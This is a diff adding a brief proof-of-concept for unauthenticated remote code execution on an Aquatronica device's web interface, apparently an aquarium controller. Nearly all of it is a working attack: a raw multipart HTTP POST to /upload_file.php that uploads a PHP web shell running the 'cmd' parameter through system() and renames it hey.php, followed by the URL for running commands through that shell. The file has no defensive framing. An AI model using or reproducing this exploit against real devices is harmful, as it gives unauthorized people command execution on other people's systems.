@@ -1,0 +1,32 @@
+Unauthenticated RCE via fileupload on aquatronica remote shiet
+
+POST /upload_file.php HTTP/1.1
+Host:xx
+User-Agent:xx
+Accept: */*
+Content-Length: 488
+Expect: 100-continue
+Content-Type: multipart/form-data; boundary=------------------------6f55f7661e994afc
+
+--------------------------6f55f7661e994afc
+Content-Disposition: form-data; name="uploaded"; filename="GlobalFile.csv"
+Content-Type: application/octet-stream
+
+<?php
+if(isset($_GET['cmd']))
+{
+system($_GET['cmd']);
+}
+?>
+
+--------------------------6f55f7661e994afc
+Content-Disposition: form-data; name="UID"
+
+163579449420561301179556
+--------------------------6f55f7661e994afc
+Content-Disposition: form-data; name="F"
+
+hey.php
+--------------------------6f55f7661e994afc--
+
+webshell on : /uploads/163579449420561301179556/hey.php?cmd=id
